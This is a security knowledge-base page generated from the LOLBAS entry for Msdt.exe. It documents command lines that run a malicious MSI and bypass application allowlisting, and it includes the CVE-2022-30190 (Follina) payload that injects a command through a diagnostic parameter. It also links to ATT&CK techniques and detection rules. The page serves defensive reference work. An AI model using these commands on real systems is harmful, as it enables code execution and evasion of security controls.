---
title: "Msdt.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Msdt.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msdt.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Msdt.exe"
functions:
  - "Execute"
  - "AWL Bypass"
attack_technique_ids:
  - "T1218"
  - "T1202"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Msdt.exe

Microsoft diagnostics tool

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Msdt.yml

## Paths

- `C:\Windows\System32\Msdt.exe`
- `C:\Windows\SysWOW64\Msdt.exe`

## Commands

### 1. Execute

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

```cmd
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

- Use Case: Execute code
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 2. AWL Bypass

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

```cmd
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

- Use Case: Execute code bypass Application whitelisting
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 3. AWL Bypass

Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.

```cmd
msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
```

- Use Case: Execute code bypass Application allowlisting
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml

## Resources

- {'Link': 'https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/'}
- {'Link': 'https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/'}
- {'Link': 'https://twitter.com/harr0ey/status/991338229952598016'}
- {'Link': 'https://twitter.com/nas_bench/status/1531944240271568896'}

## Acknowledgements

- {'Person': 'Nasreddine Bencherchali', 'Handle': '@nas_bench'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msdt.yml)
